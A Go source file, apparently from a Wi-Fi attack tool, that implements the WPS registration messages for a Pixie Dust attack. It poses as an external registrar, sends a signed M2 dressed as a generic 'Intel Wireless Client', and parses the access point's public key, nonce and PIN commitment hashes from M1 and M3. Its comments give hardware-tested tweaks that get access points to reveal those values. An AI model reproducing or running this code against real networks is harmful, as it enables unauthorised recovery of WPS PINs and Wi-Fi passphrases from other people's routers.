package wps

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
)

// WSC message encoding: the registration protocol's TLVs and the two messages WARP needs to
// build and the two it needs to read.
//
// WARP plays the **external registrar** and the access point plays the enrollee, which is the
// role assignment WPS uses for "configure this access point from a laptop". That is what puts
// the interesting values on the wire in the direction we want them: the access point sends its
// public key in M1 and its PIN commitments in M3, and it does so before it has any way of
// knowing whether the registrar it is talking to has the PIN.
//
// The exchange stops at M3. M4 is never sent, registration never completes, and nothing joins
// the network.

// WSC attribute types (WSC 2.0, Table 30).
const (
	attrAuthType       = 0x1003
	attrAuthTypeFlags  = 0x1004
	attrAuthenticator  = 0x1005
	attrConfigMethods  = 0x1008
	attrConnectionType = 0x100C
	attrEncrType       = 0x100F
	attrEncrTypeFlags  = 0x1010
	attrDeviceName     = 0x1011
	attrEHash1         = 0x1014
	attrEHash2         = 0x1015
	attrEnrolleeNonce  = 0x101A
	attrMACAddress     = 0x1020
	attrManufacturer   = 0x1021
	attrMessageType    = 0x1022
	attrModelName      = 0x1023
	attrModelNumber    = 0x1024
	attrPublicKey      = 0x1032
	// attrRegistrarNonce is 0x1039, NOT 0x101C. 0x101C is ATTR_IDENTITY - a different
	// attribute entirely. Getting this wrong puts the registrar nonce under the Identity tag,
	// so a WSC 2.0 access point parsing M2 finds no Registrar Nonce attribute and refuses with
	// a WSC_NACK whose config error is left at 0 (wps_process_registrar_nonce fails first in
	// hostapd's wps_process_m2, before the authenticator is ever checked). The M2 is otherwise
	// byte-perfect and its authenticator verifies against itself, so the failure looks like a
	// crypto mismatch and is not - it is this one tag. See hostap wps_defs.h.
	attrRegistrarNonce   = 0x1039
	attrRFBands          = 0x103C
	attrSerialNumber     = 0x1042
	attrOSVersion        = 0x102D
	attrUUIDE            = 0x1047
	attrUUIDR            = 0x1048
	attrVersion          = 0x104A
	attrPrimaryDeviceTyp = 0x1054
	attrAssocState       = 0x1002
	attrConfigError      = 0x1009
	attrDevPasswordID    = 0x1012
	attrVersion2         = 0x1049

	// The attributes the second half of registration (M4→M7) uses. M4/M6 commit the registrar's
	// secret nonces and M7 carries the access point's own configuration, including the passphrase.
	attrRHash1       = 0x103D
	attrRHash2       = 0x103E
	attrRSNonce1     = 0x103F
	attrRSNonce2     = 0x1040
	attrEncrSettings = 0x1018
	attrKeyWrapAuth  = 0x101E
	attrESNonce1     = 0x1016
	attrESNonce2     = 0x1017
	attrNetworkKey   = 0x1027
	attrSSID         = 0x1045
)

// WSC message types.
const (
	msgM1 = 0x04
	msgM2 = 0x05
	msgM3 = 0x07
	msgM4 = 0x08
	msgM5 = 0x09
	msgM6 = 0x0A
	msgM7 = 0x0B
)

// devPasswordIDDefault is the "default PIN" password ID, which is what a registrar attempting
// PIN registration declares.
const devPasswordIDDefault = 0x0000

// tlvs is a decoded attribute set. WSC attributes are big-endian type(2)/length(2)/value.
type tlvs map[uint16][]byte

// parseTLVs decodes a WSC attribute stream.
//
// A truncated attribute ends the parse rather than failing it: everything decoded before the
// truncation is correct and is usually all that is wanted, and refusing the lot because a
// vendor tacked on a malformed trailer would throw away a usable exchange.
func parseTLVs(b []byte) tlvs {
	out := tlvs{}
	for len(b) >= 4 {
		typ := binary.BigEndian.Uint16(b[0:2])
		length := int(binary.BigEndian.Uint16(b[2:4]))
		if 4+length > len(b) {
			return out
		}
		out[typ] = b[4 : 4+length]
		b = b[4+length:]
	}
	return out
}

// appendTLV writes one attribute.
func appendTLV(b []byte, typ uint16, value []byte) []byte {
	b = binary.BigEndian.AppendUint16(b, typ)
	b = binary.BigEndian.AppendUint16(b, uint16(len(value)))
	return append(b, value...)
}

func appendTLV8(b []byte, typ uint16, v byte) []byte {
	return appendTLV(b, typ, []byte{v})
}

func appendTLV16(b []byte, typ uint16, v uint16) []byte {
	return appendTLV(b, typ, binary.BigEndian.AppendUint16(nil, v))
}

// M1 is the access point's opening message: everything about it, plus the two values that
// matter - its nonce and its public key.
type M1 struct {
	// ENonce is the enrollee nonce, in the clear. It is both an input to the key derivation
	// and the oracle that recovers a clock-seeded generator's state.
	ENonce []byte
	// PKE is the enrollee's 192-octet public key.
	PKE []byte
	// MAC is the access point's own address as it declared it. On a multi-BSSID radio this is
	// not necessarily the BSSID we aimed at, and the key derivation uses this one.
	MAC []byte
	// UUIDE identifies the enrollee.
	UUIDE []byte

	// The descriptive attributes. Recorded because they identify the device in a report, and
	// because the chipset is what predicts whether Pixie Dust will work at all.
	Manufacturer string
	ModelName    string
	ModelNumber  string
	DeviceName   string
	SerialNumber string
}

// ErrNotM1 and friends report a message that is not the one expected.
var (
	ErrNotM1 = errors.New("wps: message is not M1")
	ErrNotM3 = errors.New("wps: message is not M3")
)

// ParseM1 decodes the access point's opening message.
func ParseM1(b []byte) (*M1, error) {
	t := parseTLVs(b)

	if mt, ok := t[attrMessageType]; !ok || len(mt) != 1 || mt[0] != msgM1 {
		return nil, ErrNotM1
	}

	m := &M1{
		ENonce:       t[attrEnrolleeNonce],
		PKE:          t[attrPublicKey],
		MAC:          t[attrMACAddress],
		UUIDE:        t[attrUUIDE],
		Manufacturer: string(t[attrManufacturer]),
		ModelName:    string(t[attrModelName]),
		ModelNumber:  string(t[attrModelNumber]),
		DeviceName:   string(t[attrDeviceName]),
		SerialNumber: string(t[attrSerialNumber]),
	}

	switch {
	case len(m.ENonce) != NonceLen:
		return nil, fmt.Errorf("wps: M1 enrollee nonce is %d octets, expected %d",
			len(m.ENonce), NonceLen)
	case len(m.PKE) != dhKeyLen:
		return nil, fmt.Errorf("wps: M1 public key is %d octets, expected %d",
			len(m.PKE), dhKeyLen)
	case len(m.MAC) != 6:
		return nil, fmt.Errorf("wps: M1 declares a %d-octet MAC address", len(m.MAC))
	}
	return m, nil
}

// M3 is the access point's commitment to its PIN. These two hashes are the whole attack.
type M3 struct {
	EHash1 []byte
	EHash2 []byte
}

// ParseM3 decodes the commitments.
func ParseM3(b []byte) (*M3, error) {
	t := parseTLVs(b)

	if mt, ok := t[attrMessageType]; !ok || len(mt) != 1 || mt[0] != msgM3 {
		return nil, ErrNotM3
	}

	m := &M3{EHash1: t[attrEHash1], EHash2: t[attrEHash2]}
	if len(m.EHash1) != 32 || len(m.EHash2) != 32 {
		return nil, fmt.Errorf("wps: M3 hashes are %d and %d octets, expected 32 each",
			len(m.EHash1), len(m.EHash2))
	}
	return m, nil
}

// M2Options carries what the registrar puts in its reply.
type M2Options struct {
	// EnrolleeNonce and UUIDE are echoed back from M1.
	EnrolleeNonce []byte
	UUIDE         []byte
	// RegistrarNonce and PKR are ours.
	RegistrarNonce []byte
	PKR            []byte
	// UUIDR identifies us. Generated when empty.
	UUIDR []byte
	// AuthKey signs the authenticator.
	AuthKey []byte
	// PreviousMessage is M1 exactly as it arrived, byte for byte.
	//
	// The authenticator is an HMAC over the previous message concatenated with this one, so a
	// re-encoded M1 - even a semantically identical one - produces a value the access point
	// will reject, and the exchange dies at M2 with nothing to show for it.
	PreviousMessage []byte
}

// BuildM2 assembles the registrar's reply.
//
// The descriptive attributes claim to be a generic wireless client, which is what a laptop
// running an external registrar is. They are the least conspicuous thing to send and they are
// what makes the access point willing to continue to M3.
func BuildM2(o M2Options) ([]byte, error) {
	switch {
	case len(o.EnrolleeNonce) != NonceLen:
		return nil, fmt.Errorf("wps: M2 needs the %d-octet enrollee nonce", NonceLen)
	case len(o.RegistrarNonce) != NonceLen:
		return nil, fmt.Errorf("wps: M2 needs a %d-octet registrar nonce", NonceLen)
	case len(o.PKR) != dhKeyLen:
		return nil, fmt.Errorf("wps: M2 public key is %d octets, expected %d",
			len(o.PKR), dhKeyLen)
	case len(o.AuthKey) == 0:
		return nil, errors.New("wps: M2 needs an AuthKey to sign the authenticator")
	}

	uuidR := o.UUIDR
	if len(uuidR) != 16 {
		uuidR = make([]byte, 16)
		if _, err := rand.Read(uuidR); err != nil {
			return nil, fmt.Errorf("wps: generate registrar UUID: %w", err)
		}
	}

	var b []byte
	b = appendTLV8(b, attrVersion, 0x10)
	b = appendTLV8(b, attrMessageType, msgM2)
	b = appendTLV(b, attrEnrolleeNonce, o.EnrolleeNonce)
	b = appendTLV(b, attrRegistrarNonce, o.RegistrarNonce)
	b = appendTLV(b, attrUUIDR, uuidR)
	b = appendTLV(b, attrPublicKey, o.PKR)
	// M2 carries the *Flags* attributes - the sets of auth/encryption types the registrar
	// supports - not the single-value Authentication Type / Encryption Type, which belong only in
	// the encrypted Credential. A WSC 2.0 access point validates these and refuses (NACK at M2)
	// when they are absent, which is what a lenient test never catches.
	b = appendTLV16(b, attrAuthTypeFlags, 0x0023) // Open | WPA-PSK | WPA2-PSK
	b = appendTLV16(b, attrEncrTypeFlags, 0x000C) // TKIP | AES
	b = appendTLV8(b, attrConnectionType, 0x01)
	b = appendTLV16(b, attrConfigMethods, 0x018C) // display, keypad, push button
	b = appendTLV(b, attrManufacturer, []byte("Intel"))
	b = appendTLV(b, attrModelName, []byte("Wireless Client"))
	b = appendTLV(b, attrModelNumber, []byte("1.0"))
	b = appendTLV(b, attrSerialNumber, []byte("1"))
	b = appendTLV(b, attrPrimaryDeviceTyp, []byte{
		0x00, 0x01, // category: computer
		0x00, 0x50, 0xF2, 0x04, // OUI
		0x00, 0x01, // sub-category: PC
	})
	b = appendTLV(b, attrDeviceName, []byte("Wireless Client"))
	b = appendTLV8(b, attrRFBands, 0x01)
	b = appendTLV16(b, attrAssocState, 0x0000)
	b = appendTLV16(b, attrConfigError, 0x0000)
	b = appendTLV16(b, attrDevPasswordID, devPasswordIDDefault)
	b = appendTLV(b, attrOSVersion, []byte{0x80, 0x00, 0x00, 0x00})

	// No WFA Version2 vendor extension in M2. It looks like the WSC 2.0 thing to add - the access
	// point even sends one in its own M1 - but reaver does not put it in M2, and on real hardware
	// including it gets M2 refused with a WSC_NACK (config error 0) where reaver's byte-identical-
	// otherwise M2 is accepted through to M3. Matching reaver is what works; this is deliberate.

	// The authenticator is HMAC-AuthKey(M1 || M2) truncated to 64 bits, over everything so
	// far. An access point that checks it and finds it wrong stops at M2, and the exchange
	// yields nothing - so this is not optional decoration.
	b = appendTLV(b, attrAuthenticator, authenticator(o.AuthKey, o.PreviousMessage, b))
	return b, nil
}

// authenticator computes the 64-bit HMAC over the previous message and the current one.
func authenticator(authKey, previous, current []byte) []byte {
	mac := hmac.New(sha256.New, authKey)
	mac.Write(previous)
	mac.Write(current)
	return mac.Sum(nil)[:8]
}
